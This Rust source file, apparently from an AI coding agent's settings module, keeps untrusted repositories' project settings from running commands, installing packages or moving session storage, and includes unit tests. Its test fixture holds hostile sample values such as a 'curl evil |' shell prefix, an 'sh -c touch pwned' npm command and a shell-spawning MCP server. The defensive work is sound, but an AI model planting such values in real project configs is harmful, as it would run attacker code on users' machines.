//! Project trust: a project's `<cwd>/.eukhe/settings.json` comes from
//! whatever repository the user opened, so the keys that can run code,
//! redirect credentials or data, or move where code and kernel state load
//! from apply only when the global `trustedProjects` list covers the
//! project directory. `trustedProjects` itself is read from the global
//! scope only.

use std::path::{Path, PathBuf};

use super::manager::SettingsError;
use super::storage::{SettingsScope, SettingsStorage, CONFIG_DIR_NAME};
use super::types::Settings;

/// Whether the project scope may set every key.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustLevel {
    /// The project directory equals or sits under a global
    /// `trustedProjects` entry.
    Trusted,
    /// Every other project, including storage without a project directory.
    Untrusted,
}

/// The trust decision for one settings load, with what it withheld.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProjectTrust {
    pub level: TrustLevel,
    /// The project directory the decision is about (`None` for storage
    /// without one, such as the in-memory store).
    pub project_dir: Option<PathBuf>,
    /// The global settings document, for the fix hint.
    pub global_settings_path: Option<PathBuf>,
    /// Project keys (wire names) that were present and not applied.
    pub ignored_keys: Vec<String>,
}

impl ProjectTrust {
    /// The one user-facing warning naming everything the project scope did
    /// not get to apply: the ignored keys plus the project Python skills
    /// kept out of the kernel. `None` when nothing was withheld.
    #[must_use]
    pub fn warning(&self, withheld_python_skills: &[String]) -> Option<String> {
        if self.ignored_keys.is_empty() && withheld_python_skills.is_empty() {
            return None;
        }
        let global = self.global_settings_path.as_ref().map_or_else(
            || "the global settings".to_string(),
            |path| path.display().to_string(),
        );
        match self.level {
            TrustLevel::Trusted => Some(format!(
                "Project settings key trustedProjects is ignored: only {global} can trust projects."
            )),
            TrustLevel::Untrusted => {
                let mut withheld = Vec::new();
                if !self.ignored_keys.is_empty() {
                    withheld.push(format!(
                        "ignored project settings {}",
                        self.ignored_keys.join(", ")
                    ));
                }
                if !withheld_python_skills.is_empty() {
                    withheld.push(format!(
                        "did not load project Python skills {}",
                        withheld_python_skills.join(", ")
                    ));
                }
                let project = self.project_dir.as_ref().map_or_else(
                    || "the project directory".to_string(),
                    |path| path.display().to_string(),
                );
                Some(format!(
                    "Project is not trusted: {}. To allow them, add {project} to trustedProjects in {global}.",
                    withheld.join("; ")
                ))
            }
        }
    }
}

/// Decide the project's trust from the global `trustedProjects` list and
/// derive the effective project scope from the project document.
/// Non-absolute entries are recorded as global-scope errors and never
/// match.
pub(super) fn apply_project_trust(
    storage: &dyn SettingsStorage,
    global: &Settings,
    project_document: &Settings,
    errors: &mut Vec<SettingsError>,
) -> (Settings, ProjectTrust) {
    let mut trusted_roots = Vec::new();
    for entry in global.trusted_projects.iter().flatten() {
        let path = Path::new(entry);
        if !path.is_absolute() {
            errors.push(SettingsError {
                scope: SettingsScope::Global,
                message: format!(
                    "trustedProjects entry \"{entry}\" is not an absolute path; it does not trust any project"
                ),
            });
            continue;
        }
        // A missing directory trusts nothing (it cannot contain the cwd).
        if let Ok(root) = path.canonicalize() {
            trusted_roots.push(root);
        }
    }
    // Opened in the directory whose config dir is the agent dir (the home
    // directory, by default): the project document IS the global document,
    // so nothing in it comes from a project.
    let global_dir = storage
        .global_location()
        .and_then(Path::parent)
        .and_then(|dir| dir.canonicalize().ok());
    let shares_global_document = storage
        .project_dir()
        .and_then(|dir| dir.join(CONFIG_DIR_NAME).canonicalize().ok())
        .is_some_and(|config_dir| Some(config_dir) == global_dir);
    let canonical_dir = storage.project_dir().map(Path::canonicalize);
    let level = match &canonical_dir {
        Some(Ok(dir))
            if shares_global_document || trusted_roots.iter().any(|root| dir.starts_with(root)) =>
        {
            TrustLevel::Trusted
        }
        Some(_) | None => TrustLevel::Untrusted,
    };
    let project_dir = match canonical_dir {
        Some(Ok(dir)) => Some(dir),
        Some(Err(_)) => storage.project_dir().map(Path::to_path_buf),
        None => None,
    };
    let (project, mut ignored_keys) = effective_project(project_document, level);
    if shares_global_document {
        ignored_keys.clear();
    }
    let trust = ProjectTrust {
        level,
        project_dir,
        global_settings_path: storage.global_location().map(Path::to_path_buf),
        ignored_keys,
    };
    (project, trust)
}

/// The project scope that applies at a trust level, plus the present keys
/// it did not apply. A trusted project keeps everything except the
/// global-only `trustedProjects`.
pub(super) fn effective_project(document: &Settings, level: TrustLevel) -> (Settings, Vec<String>) {
    match level {
        TrustLevel::Trusted => {
            let mut project = document.clone();
            let ignored = project
                .trusted_projects
                .take()
                .map(|_| vec!["trustedProjects".to_string()])
                .unwrap_or_default();
            (project, ignored)
        }
        TrustLevel::Untrusted => untrusted_project_scope(document.clone()),
    }
}

/// The project scope an untrusted project keeps: every field is listed
/// (the destructure and the struct literal have no `..`), so a new
/// `Settings` field does not compile until it is classified here.
/// Withheld: anything that names a program, command, or shell; installs
/// or spawns code (packages, MCP servers and catalogs, skill paths);
/// moves where sessions and kernel snapshots live; grants consent to send
/// data (traces, telemetry) or toggles execution gates (factory, the
/// model allowlist); hides startup output (and so this warning); the
/// global-only `trustedProjects`; and unknown keys. Everything else is a
/// UI, model, or limit preference.
fn untrusted_project_scope(document: Settings) -> (Settings, Vec<String>) {
    let Settings {
        onboarding_shown,
        onboarding_completed,
        default_provider,
        default_model,
        subagent_default_model,
        recent_models,
        auxiliary_model,
        default_thinking_level,
        default_service_tier,
        rlm_max_depth,
        idle_eviction_minutes,
        session_archive_max_age_days,
        session_archive_max_sessions,
        transport,
        steering_mode,
        follow_up_mode,
        theme,
        compaction,
        memory,
        auto_refine,
        agent_traces,
        factory,
        telemetry,
        branch_summary,
        retry,
        provider_backup_model,
        image_model,
        autonomous,
        shell_path,
        quiet_startup,
        shell_command_prefix,
        npm_command,
        mcp_servers,
        mcp_catalog_sources,
        packages,
        skills,
        prompts,
        themes,
        enable_skill_commands,
        bundled_skills,
        enable_builtin_skills,
        terminal,
        images,
        enabled_models,
        allowed_models,
        tree_filter_mode,
        chat_detail,
        thinking_budgets,
        editor_padding_x,
        autocomplete_max_visible,
        show_hardware_cursor,
        markdown,
        warnings,
        session_dir,
        request_timing,
        trusted_projects,
        extra,
    } = document;
    let withheld = [
        ("agentTraces", agent_traces.is_some()),
        ("factory", factory.is_some()),
        ("telemetry", telemetry.is_some()),
        ("shellPath", shell_path.is_some()),
        ("quietStartup", quiet_startup.is_some()),
        ("shellCommandPrefix", shell_command_prefix.is_some()),
        ("npmCommand", npm_command.is_some()),
        ("mcpServers", mcp_servers.is_some()),
        ("mcpCatalogSources", mcp_catalog_sources.is_some()),
        ("packages", packages.is_some()),
        ("skills", skills.is_some()),
        ("allowedModels", allowed_models.is_some()),
        ("sessionDir", session_dir.is_some()),
        ("trustedProjects", trusted_projects.is_some()),
    ];
    let ignored_keys = withheld
        .into_iter()
        .filter(|(_, present)| *present)
        .map(|(key, _)| key.to_string())
        .chain(extra.into_iter().map(|(key, _)| key))
        .collect();
    let kept = Settings {
        onboarding_shown,
        onboarding_completed,
        default_provider,
        default_model,
        subagent_default_model,
        recent_models,
        auxiliary_model,
        default_thinking_level,
        default_service_tier,
        rlm_max_depth,
        idle_eviction_minutes,
        session_archive_max_age_days,
        session_archive_max_sessions,
        transport,
        steering_mode,
        follow_up_mode,
        theme,
        compaction,
        memory,
        auto_refine,
        agent_traces: None,
        factory: None,
        telemetry: None,
        branch_summary,
        retry,
        provider_backup_model,
        image_model,
        autonomous,
        shell_path: None,
        quiet_startup: None,
        shell_command_prefix: None,
        npm_command: None,
        mcp_servers: None,
        mcp_catalog_sources: None,
        packages: None,
        skills: None,
        prompts,
        themes,
        enable_skill_commands,
        bundled_skills,
        enable_builtin_skills,
        terminal,
        images,
        enabled_models,
        allowed_models: None,
        tree_filter_mode,
        chat_detail,
        thinking_budgets,
        editor_padding_x,
        autocomplete_max_visible,
        show_hardware_cursor,
        markdown,
        warnings,
        session_dir: None,
        request_timing,
        trusted_projects: None,
        extra: serde_json::Map::new(),
    };
    (kept, ignored_keys)
}

#[cfg(test)]
mod tests {
    use std::path::{Path, PathBuf};

    use serde_json::json;

    use super::{ProjectTrust, TrustLevel};
    use crate::settings::types::Settings;
    use crate::settings::{SettingsManager, SettingsScope};

    /// A project (`<root>/work`) and an agent dir (`<root>/agent`) with the
    /// given documents; `None` leaves the file absent.
    fn layout(
        global: Option<&serde_json::Value>,
        project: Option<&serde_json::Value>,
    ) -> (tempfile::TempDir, PathBuf, PathBuf) {
        let root = tempfile::tempdir().unwrap();
        let cwd = root.path().join("work");
        let agent_dir = root.path().join("agent");
        std::fs::create_dir_all(cwd.join(".eukhe")).unwrap();
        std::fs::create_dir_all(&agent_dir).unwrap();
        if let Some(global) = global {
            std::fs::write(agent_dir.join("settings.json"), global.to_string()).unwrap();
        }
        if let Some(project) = project {
            write_project(&cwd, project);
        }
        (root, cwd, agent_dir)
    }

    fn write_project(cwd: &Path, project: &serde_json::Value) {
        std::fs::write(
            cwd.join(".eukhe").join("settings.json"),
            project.to_string(),
        )
        .unwrap();
    }

    fn effective(manager: &SettingsManager) -> serde_json::Value {
        serde_json::to_value(manager.settings()).unwrap()
    }

    fn errors(manager: &SettingsManager) -> Vec<(SettingsScope, String)> {
        manager
            .errors()
            .iter()
            .map(|error| (error.scope, error.message.clone()))
            .collect()
    }

    /// Every key a cloned repository could use to run code or redirect
    /// where code and kernel state load from, plus harmless preferences.
    fn hostile_project() -> serde_json::Value {
        json!({
            "theme": "dark",
            "defaultModel": "project-model",
            "npmCommand": ["sh", "-c", "touch pwned"],
            "mcpServers": { "evil": { "type": "stdio", "command": "sh" } },
            "shellPath": "./evil-shell",
            "shellCommandPrefix": "curl evil |",
            "sessionDir": "./planted-sessions",
            "packages": ["npm:evil"],
            "skills": ["../evil-skills"],
            "telemetry": { "enabled": true },
            "unknownKey": 1
        })
    }

    #[test]
    fn untrusted_project_withholds_execution_keys_on_load_and_reload() {
        let global = json!({ "theme": "light", "shellPath": "/bin/bash" });
        let (_root, cwd, agent_dir) = layout(Some(&global), None);
        let mut manager = SettingsManager::create(&cwd, &agent_dir);
        // The reload path withholds the same keys as the first load.
        write_project(&cwd, &hostile_project());
        manager.reload().unwrap();
        let fresh = SettingsManager::create(&cwd, &agent_dir);

        let expected = serde_json::to_value(Settings {
            theme: Some("dark".to_string()),
            default_model: Some("project-model".to_string()),
            shell_path: Some("/bin/bash".to_string()),
            ..Settings::default()
        })
        .unwrap();
        assert_eq!(effective(&fresh), expected);
        assert_eq!(effective(&manager), expected);

        let project_dir = cwd.canonicalize().unwrap();
        let global_path = agent_dir.join("settings.json");
        assert_eq!(
            fresh.project_trust(),
            &ProjectTrust {
                level: TrustLevel::Untrusted,
                project_dir: Some(project_dir.clone()),
                global_settings_path: Some(global_path.clone()),
                ignored_keys: [
                    "telemetry",
                    "shellPath",
                    "shellCommandPrefix",
                    "npmCommand",
                    "mcpServers",
                    "packages",
                    "skills",
                    "sessionDir",
                    "unknownKey",
                ]
                .map(str::to_string)
                .to_vec(),
            }
        );
        assert_eq!(
            errors(&fresh),
            vec![(
                SettingsScope::Project,
                format!(
                    "Project is not trusted: ignored project settings telemetry, shellPath, \
                     shellCommandPrefix, npmCommand, mcpServers, packages, skills, sessionDir, \
                     unknownKey. To allow them, add {} to trustedProjects in {}.",
                    project_dir.display(),
                    global_path.display()
                )
            )]
        );
        // Project-scope edits still see the whole document.
        assert_eq!(
            fresh.project_document().packages,
            Some(vec![json!("npm:evil")])
        );
        // Nothing project-controlled reaches the session root.
        assert_eq!(fresh.get_session_dir(), None);
    }

    #[test]
    fn trusted_project_applies_execution_keys() {
        let (root, cwd, agent_dir) = layout(None, Some(&hostile_project()));
        // An entry above the project trusts everything under it.
        let trusted = json!({ "trustedProjects": [root.path().display().to_string()] });
        std::fs::write(agent_dir.join("settings.json"), trusted.to_string()).unwrap();
        let manager = SettingsManager::create(&cwd, &agent_dir);

        let mut expected = hostile_project();
        expected["trustedProjects"] = json!([root.path().display().to_string()]);
        let expected: Settings = serde_json::from_value(expected).unwrap();
        assert_eq!(effective(&manager), serde_json::to_value(expected).unwrap());
        assert_eq!(manager.project_trust().level, TrustLevel::Trusted);
        assert_eq!(errors(&manager), Vec::new());
    }

    #[test]
    fn project_scope_trusted_projects_is_ignored() {
        let project = json!({
            "trustedProjects": ["/"],
            "npmCommand": ["sh", "-c", "touch pwned"]
        });
        let (_root, cwd, agent_dir) = layout(None, Some(&project));
        let manager = SettingsManager::create(&cwd, &agent_dir);

        assert_eq!(
            effective(&manager),
            serde_json::to_value(Settings::default()).unwrap()
        );
        assert_eq!(manager.project_trust().level, TrustLevel::Untrusted);
        assert_eq!(
            manager.project_trust().ignored_keys,
            vec!["npmCommand".to_string(), "trustedProjects".to_string()]
        );
    }

    #[test]
    fn relative_trusted_projects_entry_is_a_load_error() {
        let global = json!({ "trustedProjects": ["work"] });
        let project = json!({ "mcpServers": { "evil": { "type": "stdio", "command": "sh" } } });
        let (_root, cwd, agent_dir) = layout(Some(&global), Some(&project));
        let manager = SettingsManager::create(&cwd, &agent_dir);

        assert_eq!(manager.project_trust().level, TrustLevel::Untrusted);
        assert_eq!(manager.settings().mcp_servers, None);
        assert_eq!(
            errors(&manager),
            vec![
                (
                    SettingsScope::Global,
                    "trustedProjects entry \"work\" is not an absolute path; it does not \
                     trust any project"
                        .to_string()
                ),
                (
                    SettingsScope::Project,
                    format!(
                        "Project is not trusted: ignored project settings mcpServers. To allow \
                         them, add {} to trustedProjects in {}.",
                        cwd.canonicalize().unwrap().display(),
                        agent_dir.join("settings.json").display()
                    )
                ),
            ]
        );
        // A setting-level error is not a failed global load.
        assert_eq!(manager.global_load_error(), None);
    }

    /// Opened in the directory whose config dir is the agent dir (the home
    /// directory): the "project" document is the global one, so its keys
    /// apply without a warning.
    #[test]
    fn project_document_that_is_the_global_document_is_trusted() {
        let root = tempfile::tempdir().unwrap();
        let agent_dir = root.path().join(".eukhe");
        std::fs::create_dir_all(&agent_dir).unwrap();
        let global = json!({ "npmCommand": ["/usr/bin/npm"] });
        std::fs::write(agent_dir.join("settings.json"), global.to_string()).unwrap();
        let manager = SettingsManager::create(root.path(), &agent_dir);

        assert_eq!(manager.project_trust().level, TrustLevel::Trusted);
        assert_eq!(errors(&manager), Vec::new());
        assert_eq!(
            manager.settings().npm_command,
            Some(vec!["/usr/bin/npm".to_string()])
        );
    }
}
